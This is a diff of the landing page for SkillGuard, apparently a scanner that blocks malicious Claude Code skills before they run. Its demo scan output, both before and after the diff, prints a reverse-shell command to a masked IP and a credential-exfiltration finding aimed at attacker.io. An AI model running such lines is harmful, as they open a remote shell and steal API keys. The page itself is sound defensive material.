+.step h3 {
+  margin: 0 0 10px;
+  font-size: 26px;
+  line-height: 1;
+  text-transform: uppercase;
+}
+
+.step p { margin: 0; color: var(--muted); }
+.step code,
+.faq code {
+  font-family: var(--mono);
+  font-size: 0.9em;
+  color: var(--red-dark);
+}
+
+.faq-list {
+  border: 2px solid var(--ink);
+  background: var(--panel);
+}
+
+details {
+  border-bottom: 2px solid var(--ink);
+}
+details:last-child { border-bottom: 0; }
+
+summary {
+  cursor: pointer;
+  list-style: none;
+  padding: 18px 20px;
+  font-size: 19px;
+  font-weight: 900;
+  text-transform: uppercase;
+}
+summary::-webkit-details-marker { display: none; }
+summary::after {
+  content: "+";
+  float: right;
+  color: var(--red);
+  font-family: var(--mono);
+}
+details[open] summary::after { content: "-"; }
+
+.answer {
+  max-width: 870px;
+  padding: 0 20px 18px;
+  color: var(--muted);
+}
+
+.cta {
+  background: var(--ink);
+  color: #fff;
+}
+
+.cta h2,
+.cta .section-kicker { color: #fff; }
+
+.cta .section-kicker { color: #ff7a86; }
+
+.cta .install-box {
+  border-color: #fff;
+  box-shadow: 8px 8px 0 var(--red);
+}
+
+.cta a { color: #fff; }
+
+.license-line {
+  max-width: 740px;
+  margin: 20px 0 0;
+  color: #c8c8c8;
+  font-size: 14px;
+}
+
+footer {
+  padding: 34px 0;
+  background: var(--paper);
+}
+
+.footer-inner {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 18px;
+  flex-wrap: wrap;
+}
+
+.footer-links {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  flex-wrap: wrap;
+  font-family: var(--mono);
+  font-size: 12px;
+  text-transform: uppercase;
+}
+
+.footer-links a { color: var(--ink); text-decoration: none; border-bottom: 2px solid var(--red); }
+
+@media (prefers-reduced-motion: reduce) {
+  html { scroll-behavior: auto; }
+  .request-card,
+  .stamp { animation: none !important; }
+  .request-card {
+    transform: translateX(calc(50% - 154px));
+    opacity: 1;
+  }
+  .stamp {
+    opacity: 1;
+    transform: rotate(-9deg) scale(1);
+  }
+  .terminal video { display: none !important; }
+  .terminal .transcript { display: block !important; }
+}
+
+@media (max-width: 940px) {
+  .hero-grid { grid-template-columns: 1fr; }
+  h1 { font-size: 58px; }
+  .proof-grid,
+  .steps { grid-template-columns: 1fr; }
+  .proof-card {
+    border-right: 0;
+    border-bottom: 2px solid var(--ink);
+  }
+  .proof-card:last-child { border-bottom: 0; }
+}
+
+@media (max-width: 640px) {
+  body { font-size: 16px; }
+  .wrap { width: min(100% - 28px, var(--max)); }
+  .nav-inner { min-height: 56px; }
+  .brand span:last-child { display: none; }
+  .nav-links { gap: 12px; font-size: 12px; }
+  .hero { padding: 46px 0 42px; }
+  h1 { font-size: 42px; }
+  h2 { font-size: 32px; }
+  .sub { font-size: 18px; }
+  .install-box { box-shadow: 5px 5px 0 var(--red); }
+  .install-box pre { font-size: 11px; }
+  .wall { box-shadow: 6px 6px 0 var(--ink); }
+  .wall-stage { height: 230px; }
+  .request-card {
+    left: 14px;
+    width: 190px;
+    transform: none;
+    animation: none !important;
+  }
+  .stamp { right: 16px; top: 112px; font-size: 22px; }
+  section { padding: 50px 0; }
+  .proof-num { font-size: 44px; }
+  summary { font-size: 16px; }
+  .footer-inner { align-items: flex-start; }
+}
+</style>
 </head>
 <body>
-  <a class="skip-link" href="#main">Skip to content</a>
+<a class="skip-link" href="#main">Skip to content</a>
 
-  <!-- NAV -->
-  <header class="nav">
-    <div class="container nav-inner">
-      <a class="brand" href="#top" aria-label="SkillGuard home">
-        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3DDC97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <path d="M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z" />
-          <path d="m9 12 2 2 4-4" />
-        </svg>
-        <span>SkillGuard</span>
-      </a>
-      <nav class="nav-links" aria-label="Primary">
-        <a href="https://github.com/mannanj/skillguard#install" rel="noopener">Install</a>
-        <a href="https://github.com/mannanj/skillguard" rel="noopener">GitHub</a>
-      </nav>
-    </div>
-  </header>
+<header class="nav">
+  <div class="wrap nav-inner">
+    <a class="brand" href="#top" aria-label="SkillGuard home">
+      <span class="mark-box" aria-hidden="true">!</span>
+      <span>SkillGuard</span>
+    </a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="#install">Install</a>
+      <a href="https://github.com/mannanj/skillguard" rel="noopener">GitHub</a>
+    </nav>
+  </div>
+</header>
 
-  <main id="main">
-    <span id="top"></span>
+<main id="main">
+  <span id="top"></span>
 
-    <!-- HERO -->
-    <section class="hero" aria-labelledby="hero-heading">
-      <div class="container">
-        <!-- Gate animation: clean skills pass, the malicious one is refused -->
-        <div class="gate" role="img" aria-label="Animation: community skills move toward the SkillGuard gate. Clean skills turn green and continue to Claude Code; pretty-formatter is stopped at the gate and flagged for a reverse shell.">
-          <div class="gate-labels" aria-hidden="true">
-            <span>community skills</span>
-            <span>cleared for Claude</span>
-          </div>
-          <div class="gate-track" aria-hidden="true">
-            <div class="gate-post">
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3DDC97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z" />
-                <path d="m9 12 2 2 4-4" />
-              </svg>
-            </div>
-            <div class="chip chip-clean c1" style="--d: 0s;">
-              <span class="chip-name">pdf-tools</span><span class="chip-mark">&#10003;</span>
-            </div>
-            <div class="chip chip-bad cb" style="--d: 3s;">
-              <span class="chip-name">pretty-formatter</span><span class="chip-mark">&#10007;</span>
-              <span class="chip-tag">reverse shell</span>
-            </div>
-            <div class="chip chip-clean c2" style="--d: 6s;">
-              <span class="chip-name">git-helper</span><span class="chip-mark">&#10003;</span>
-            </div>
-            <div class="chip chip-clean c3" style="--d: 9s;">
-              <span class="chip-name">web-search</span><span class="chip-mark">&#10003;</span>
-            </div>
-          </div>
-        </div>
-
-        <h1 id="hero-heading">Scan every skill. <span class="em">Block what's unscanned.</span></h1>
-        <p class="subhead">
-          An open-source scanner that catches prompt injection, credential theft, and reverse shells in Claude Code skills — and a <strong>PreToolUse hook that won't run what hasn't been scanned</strong>. Local by default.
-        </p>
-
-        <div class="install">
-          <div class="codebox">
-            <div class="codebox-head">
-              <span class="codebox-label">Claude Code plugin · recommended</span>
-              <button class="copy-btn" type="button" data-copy="/plugin marketplace add mannanj/skillguard
-/plugin install skillguard@skillguard" aria-label="Copy install commands to clipboard">Copy</button>
-            </div>
-            <pre><code><span class="prompt">&gt; </span>/plugin marketplace add mannanj/skillguard
-<span class="prompt">&gt; </span>/plugin install skillguard@skillguard</code></pre>
-          </div>
-
-          <p class="verify">
-            <span><span class="check">&#10003;</span> Verify: SkillGuard status line appears on your next skill use</span>
-            <span class="verify-links">
-              <a href="https://github.com/mannanj/skillguard#install" rel="noopener">More install methods &rarr;</a>
-              <a href="https://github.com/mannanj/skillguard" rel="noopener">View source</a>
-            </span>
-          </p>
-        </div>
-      </div>
-    </section>
-
-    <!-- DEMO -->
-    <section aria-labelledby="demo-heading">
-      <div class="container">
-        <p class="section-label">See it block</p>
-        <h2 id="demo-heading">A malicious skill, refused at the gate</h2>
-
-        <div class="terminal" id="demo-terminal">
-          <div class="terminal-bar" aria-hidden="true">
-            <span class="dot r"></span>
-            <span class="dot y"></span>
-            <span class="dot g"></span>
-            <span class="terminal-title">skillguard — scan</span>
-          </div>
-
-          <video
-            id="demo-video"
-            src="demo.mp4"
-            poster="demo-poster.png"
-            muted
-            autoplay
-            loop
-            playsinline
-            preload="metadata"
-            aria-label="Terminal recording: SkillGuard scanning the pretty-formatter skill and blocking it for a reverse shell, credential exfiltration, and prompt injection.">
-          </video>
-
-          <!-- Static transcript: serves no-JS and prefers-reduced-motion users -->
-          <pre class="transcript" role="img" aria-label="SkillGuard scan output: pretty-formatter blocked for a reverse shell, credential exfiltration, and prompt injection; the PreToolUse hook refused execution and zero commands ran.">
-<span class="prompt">$</span> skillguard --skill pretty-formatter
-<span class="scan">SkillGuard &#10687; scanning pretty-formatter ...</span>
-<span class="blocked">&#10007; BLOCKED  reverse shell: bash -i &gt;&amp; /dev/tcp/45.x.x.x/4444</span>
-<span class="blocked">&#10007; BLOCKED  credential exfil: reads ANTHROPIC_API_KEY &rarr; POST attacker.io</span>
-<span class="blocked">&#10007; BLOCKED  prompt injection in SKILL.md (zero-width chars)</span>
-<span class="refused">PreToolUse hook refused execution. 0 commands ran.</span></pre>
-        </div>
-      </div>
-    </section>
-
-    <!-- WHAT IT CATCHES -->
-    <section aria-labelledby="catches-heading">
-      <div class="container">
-        <p class="section-label">What it catches</p>
-        <h2 id="catches-heading">Found in the wild</h2>
-        <p class="evidence">
-          When Koi Security audited ClawHub, it found <a href="https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting" rel="noopener">341 malicious skills</a> — typosquats shipping infostealers. <a href="https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/" rel="noopener">Snyk's ToxicSkills study</a> of the same registry found a critical issue in <strong>13.4% of all skills</strong>. Claude Code skills share the same trust model: files you probably never read, running with your permissions.
-        </p>
-
-        <ul class="catches" role="list">
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            Prompt injection in SKILL.md
-          </li>
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            Credential &amp; env-var exfiltration
-          </li>
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            Reverse shells &amp; hidden subprocesses
-          </li>
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            Zero-width &amp; base64 obfuscation
-          </li>
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            Persistence &amp; container escape
-          </li>
-          <li class="catch">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m5 13 4 4L19 7" /></svg>
-            <code style="font-family:var(--font-mono);font-size:14px;">curl | sh</code>&nbsp;pipe execution
-          </li>
+  <section class="hero" aria-labelledby="hero-heading">
+    <div class="wrap hero-grid">
+      <div>
+        <p class="eyebrow">PreToolUse refusal gate</p>
+        <h1 id="hero-heading">Refuse <span>unscanned.</span></h1>
+        <p class="sub">SkillGuard reads Claude Code skills and MCP servers, then blocks unscanned, changed, or critical/high targets before Claude runs them.</p>
+        <ul class="meta-row" aria-label="Supported surfaces and guarantees">
+          <li>Skills</li>
+          <li>MCP</li>
+          <li>Local first</li>
+          <li>Secrets redacted</li>
         </ul>
-      </div>
-    </section>
 
-    <!-- HOW IT WORKS -->
-    <section aria-labelledby="how-heading">
-      <div class="container">
-        <p class="section-label">How it works</p>
-        <h2 id="how-heading">A scanner, a gate, and rules you can read</h2>
-
-        <div class="pillars">
-          <article class="pillar">
-            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-              <path d="M14 3v4a1 1 0 0 0 1 1h4" />
-              <path d="M5 3h9l5 5v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Z" />
-              <path d="M8 12h8M8 16h6" />
-            </svg>
-            <h3>Scans every file in every skill</h3>
-            <p>A zero-dependency local engine checks 60+ readable patterns across 12 threat categories. Optional Cisco, Snyk, and SkillAudit engines add second opinions when you want them.</p>
-          </article>
-
-          <article class="pillar">
-            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-              <rect x="5" y="11" width="14" height="9" rx="2" />
-              <path d="M8 11V8a4 4 0 0 1 8 0v3" />
-              <path d="M12 15v2" />
-            </svg>
-            <h3>Blocks via PreToolUse hook</h3>
-            <p>Unscanned skills are refused before they run, and a skill modified after its last scan is blocked until you re-scan. Skipping is possible — but it's an explicit choice, never the default.</p>
-          </article>
-
-          <article class="pillar">
-            <svg class="pillar-icon" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" />
-              <circle cx="12" cy="12" r="3" />
-            </svg>
-            <h3>Rules you can read</h3>
-            <p>Local by default — file contents leave your machine only if you enable a cloud engine. Every local detection is a pattern you can open and audit, and false positives are one <code>--mark-fp</code> away.</p>
-          </article>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECOND INSTALL CTA -->
-    <section class="cta-section" aria-labelledby="cta-heading">
-      <div class="container">
-        <p class="section-label">Get started</p>
-        <h2 id="cta-heading">Install in two lines</h2>
-
-        <div class="install">
-          <div class="codebox">
-            <div class="codebox-head">
-              <span class="codebox-label">Claude Code plugin · recommended</span>
-              <button class="copy-btn" type="button" data-copy="/plugin marketplace add mannanj/skillguard
-/plugin install skillguard@skillguard" aria-label="Copy install commands to clipboard">Copy</button>
-            </div>
-            <pre><code><span class="prompt">&gt; </span>/plugin marketplace add mannanj/skillguard
-<span class="prompt">&gt; </span>/plugin install skillguard@skillguard</code></pre>
+        <div class="install-box" id="install">
+          <div class="install-head">
+            <span>Install and scan</span>
+            <button class="copy-btn" type="button" data-copy="curl -fsSL https://skillguard.sh/install | sh
+python3 ~/.claude/skillguard/cli.py \
+  --engines local" aria-label="Copy install commands">Copy</button>
           </div>
-          <p class="license-line">
-            Open source under <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">AGPL-3.0</a>. Need it without copyleft obligations? <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE-COMMERCIAL.md" rel="noopener">Commercial licenses</a> available.
-          </p>
+          <pre><code><span class="prompt">$</span> curl -fsSL https://skillguard.sh/install | sh
+<span class="prompt">$</span> python3 ~/.claude/skillguard/cli.py \
+<span class="indent">  --engines local</span></code></pre>
+        </div>
+        <p class="install-note">Prefer Claude Code plugins? Use the marketplace commands in <a href="#faq">FAQ</a>. The first scan covers skills and MCP servers.</p>
+      </div>
+
+      <div class="wall" role="img" aria-label="SkillGuard PreToolUse wall refusing the pretty-formatter skill before any command runs.">
+        <div class="wall-top">
+          <span>Runtime event: skill request</span>
+          <span class="status-red">Blocked</span>
+        </div>
+        <div class="wall-stage" aria-hidden="true">
+          <span class="wall-label">PreToolUse wall</span>
+          <div class="request-card">
+            <div>
+              <span class="request-name">pretty-formatter</span>
+              <span class="request-risk">reverse shell</span>
+            </div>
+          </div>
+          <div class="stamp">Refused</div>
+        </div>
+        <div class="receipt">
+          <dl class="receipt-grid">
+            <dt>target</dt><dd>pretty-formatter</dd>
+            <dt>finding</dt><dd class="red">critical / reverse_shell</dd>
+            <dt>action</dt><dd>exit 2 before execution</dd>
+            <dt>commands</dt><dd>0 ran</dd>
+          </dl>
         </div>
       </div>
-    </section>
-  </main>
-
-  <!-- FOOTER -->
-  <footer>
-    <div class="container footer-inner">
-      <div class="footer-brand">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3DDC97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <path d="M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z" />
-          <path d="m9 12 2 2 4-4" />
-        </svg>
-        <span>SkillGuard</span>
-      </div>
-      <nav class="footer-links" aria-label="Footer">
-        <a href="https://github.com/mannanj/skillguard" rel="noopener">GitHub</a>
-        <span class="sep" aria-hidden="true">·</span>
-        <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">AGPL-3.0 License</a>
-        <span class="sep" aria-hidden="true">·</span>
-        <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE-COMMERCIAL.md" rel="noopener">Commercial license</a>
-        <span class="sep" aria-hidden="true">·</span>
-        <span class="footer-note">Built for the Claude Code community</span>
-      </nav>
     </div>
-  </footer>
+  </section>
 
-  <script>
-    // Copy-to-clipboard with graceful fallback.
-    (function () {
-      function flash(btn) {
-        var original = btn.textContent;
-        btn.textContent = "Copied ✓";
-        btn.classList.add("copied");
-        setTimeout(function () {
-          btn.textContent = original;
-          btn.classList.remove("copied");
-        }, 1500);
-      }
+  <section aria-labelledby="proof-heading">
+    <div class="wrap">
+      <p class="section-kicker">The shape of the risk</p>
+      <h2 id="proof-heading">Skill marketplaces already have a malware curve.</h2>
+      <div class="proof-grid">
+        <article class="proof-card">
+          <span class="proof-num">824</span>
+          <h3>malicious skills after one Koi update</h3>
+          <p>Koi's ClawHavoc count rose from 341 to 824 as ClawHub grew.</p>
+        </article>
+        <article class="proof-card">
+          <span class="proof-num">13.4%</span>
+          <h3>critical issue rate in Snyk's audit</h3>
+          <p>Snyk found 534 of 3,984 audited skills had at least one critical issue.</p>
+        </article>
+        <article class="proof-card">
+          <span class="proof-num">1,467</span>
+          <h3>skills with at least one flaw</h3>
+          <p>That is the broader affected set in Snyk's public ToxicSkills report.</p>
+        </article>
+      </div>
+      <p class="proof-note">Sources: <a href="https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting" rel="noopener">Koi ClawHavoc update</a> and <a href="https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/" rel="noopener">Snyk ToxicSkills study</a>. SkillGuard has reproduced third-party detections and blocks the same classes of risk at your local gate.</p>
+    </div>
+  </section>
 
-      function legacyCopy(text) {
-        var ta = document.createElement("textarea");
-        ta.value = text;
-        ta.setAttribute("readonly", "");
-        ta.style.position = "absolute";
-        ta.style.left = "-9999px";
-        document.body.appendChild(ta);
-        ta.select();
-        try { document.execCommand("copy"); } catch (e) { /* no-op */ }
-        document.body.removeChild(ta);
-      }
+  <section aria-labelledby="demo-heading">
+    <div class="wrap">
+      <p class="section-kicker">Actual output</p>
+      <h2 id="demo-heading">The block is not a report you forget.</h2>
+      <div class="terminal" id="demo-terminal">
+        <div class="terminal-bar" aria-hidden="true">
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span class="terminal-title">pretty-formatter refused / 0 commands ran</span>
+        </div>
+        <video id="demo-video" src="demo.mp4" poster="demo-poster.png" muted autoplay loop playsinline preload="metadata" aria-label="Terminal recording of SkillGuard scanning and blocking pretty-formatter."></video>
+        <pre class="transcript" role="img" aria-label="SkillGuard scan output: pretty-formatter blocked for reverse shell, credential exfiltration, and prompt injection."><span class="prompt">$</span> skillguard --skill pretty-formatter
+<span class="dim">SkillGuard scanning pretty-formatter ...</span>
+<span class="bad">BLOCKED reverse shell: bash -i &gt;&amp; /dev/tcp/45.x.x.x/4444</span>
+<span class="bad">BLOCKED credential exfil: reads ANTHROPIC_API_KEY</span>
+<span class="bad">BLOCKED prompt injection in SKILL.md</span>
+<span class="dim">PreToolUse hook refused execution. 0 commands ran.</span></pre>
+      </div>
+    </div>
+  </section>
 
-      var buttons = document.querySelectorAll(".copy-btn");
-      for (var i = 0; i < buttons.length; i++) {
-        buttons[i].addEventListener("click", function () {
-          var btn = this;
-          var text = btn.getAttribute("data-copy") || "";
-          if (navigator.clipboard && navigator.clipboard.writeText) {
-            navigator.clipboard.writeText(text).then(
-              function () { flash(btn); },
-              function () { legacyCopy(text); flash(btn); }
-            );
-          } else {
-            legacyCopy(text);
-            flash(btn);
-          }
-        });
-      }
+  <section aria-labelledby="how-heading">
+    <div class="wrap">
+      <p class="section-kicker">How it works</p>
+      <h2 id="how-heading">Read. Refuse. Record.</h2>
+      <div class="steps">
+        <article class="step">
+          <span class="step-num">1</span>
+          <h3>Read</h3>
+          <p>Scan <code>SKILL.md</code>, bundled scripts, MCP configs, launch commands, endpoint metadata, and env/header names.</p>
+        </article>
+        <article class="step">
+          <span class="step-num">2</span>
+          <h3>Refuse</h3>
+          <p>The hook blocks unscanned, changed, or critical/high targets. A bypass has to be explicit.</p>
+        </article>
+        <article class="step">
+          <span class="step-num">3</span>
+          <h3>Record</h3>
+          <p>History and activity stay local. Secret values are scanned in memory and redacted before anything persists.</p>
+        </article>
+      </div>
+    </div>
+  </section>
 
-      // Show the static transcript instead of the video if the video can't load,
-      // or if the user prefers reduced motion (CSS also enforces the latter).
-      var term = document.getElementById("demo-terminal");
-      var vid = document.getElementById("demo-video");
-      var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-      if (term && (reduce || !vid)) {
-        term.setAttribute("data-show-fallback", "true");
+  <section class="faq" id="faq" aria-labelledby="faq-heading">
+    <div class="wrap">
+      <p class="section-kicker">Before install</p>
+      <h2 id="faq-heading">The details stay here.</h2>
+      <div class="faq-list">
+        <details>
+          <summary>What gets scanned?</summary>
+          <div class="answer">Claude Code skills, bundled scripts, and MCP server surfaces from global, project, and plugin config files.</div>
+        </details>
+        <details>
+          <summary>MCP too?</summary>
+          <div class="answer">Yes. SkillGuard scans MCP launch surfaces and gates MCP tool calls through <code>mcp_policy</code>, which defaults to <code>enforce</code>.</div>
+        </details>
+        <details>
+          <summary>Do API keys touch disk?</summary>
+          <div class="answer">No. Env and header values are inspected in memory, then redacted; only names, findings, cache verdicts, and history records persist.</div>
+        </details>
+        <details>
+          <summary>What leaves my machine?</summary>
+          <div class="answer">The local engine is stdlib-only and offline; files leave your machine only when you enable an optional cloud engine.</div>
+        </details>
+        <details>
+          <summary>Prefer the Claude Code plugin?</summary>
+          <div class="answer">Inside Claude Code, run <code>/plugin marketplace add mannanj/skillguard</code> and then <code>/plugin install skillguard@skillguard</code>.</div>
+        </details>
+        <details>
+          <summary>Can I ship it commercially?</summary>
+          <div class="answer">The community build is AGPL-3.0; <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE-COMMERCIAL.md" rel="noopener">commercial licenses</a> are available when copyleft does not fit.</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section class="cta" aria-labelledby="cta-heading">
+    <div class="wrap">
+      <p class="section-kicker">Install</p>
+      <h2 id="cta-heading">Put the wall in front of Claude.</h2>
+      <div class="install-box">
+        <div class="install-head">
+          <span>Copy commands</span>
+          <button class="copy-btn" type="button" data-copy="curl -fsSL https://skillguard.sh/install | sh
+python3 ~/.claude/skillguard/cli.py \
+  --engines local" aria-label="Copy install commands">Copy</button>
+        </div>
+        <pre><code><span class="prompt">$</span> curl -fsSL https://skillguard.sh/install | sh
+<span class="prompt">$</span> python3 ~/.claude/skillguard/cli.py \
+<span class="indent">  --engines local</span></code></pre>
+      </div>
+      <p class="license-line">Open source under <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">AGPL-3.0</a>. Commercial license available for teams that need it.</p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap footer-inner">
+    <a class="brand" href="#top" aria-label="SkillGuard home">
+      <span class="mark-box" aria-hidden="true">!</span>
+      <span>SkillGuard</span>
+    </a>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="https://github.com/mannanj/skillguard" rel="noopener">Source</a>
+      <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE" rel="noopener">AGPL</a>
+      <a href="https://github.com/mannanj/skillguard/blob/main/LICENSE-COMMERCIAL.md" rel="noopener">Commercial</a>
+      <span>Made by Mannan</span>
+    </nav>
+  </div>
+</footer>
+
+<script>
+(function () {
+  function flash(btn) {
+    var original = btn.textContent;
+    btn.textContent = "Copied";
+    btn.classList.add("copied");
+    setTimeout(function () {
+      btn.textContent = original;
+      btn.classList.remove("copied");
+    }, 1500);
+  }
+
+  function legacyCopy(text) {
+    var ta = document.createElement("textarea");
+    ta.value = text;
+    ta.setAttribute("readonly", "");
+    ta.style.position = "absolute";
+    ta.style.left = "-9999px";
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand("copy"); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  var buttons = document.querySelectorAll(".copy-btn");
+  for (var i = 0; i < buttons.length; i++) {
+    buttons[i].addEventListener("click", function () {
+      var btn = this;
+      var text = btn.getAttribute("data-copy") || "";
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(
+          function () { flash(btn); },
+          function () { legacyCopy(text); flash(btn); }
+        );
+      } else {
+        legacyCopy(text);
+        flash(btn);
       }
-      if (vid) {
-        vid.addEventListener("error", function () {
-          term.setAttribute("data-show-fallback", "true");
-        });
-      }
-    })();
-  </script>
+    });
+  }
+
+  var term = document.getElementById("demo-terminal");
+  var vid = document.getElementById("demo-video");
+  var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  if (term && (reduce || !vid)) {
+    term.setAttribute("data-show-fallback", "true");
+  }
+  if (term && vid) {
+    vid.addEventListener("error", function () {
+      term.setAttribute("data-show-fallback", "true");
+    });
+  }
+})();
+</script>
 </body>
 </html>
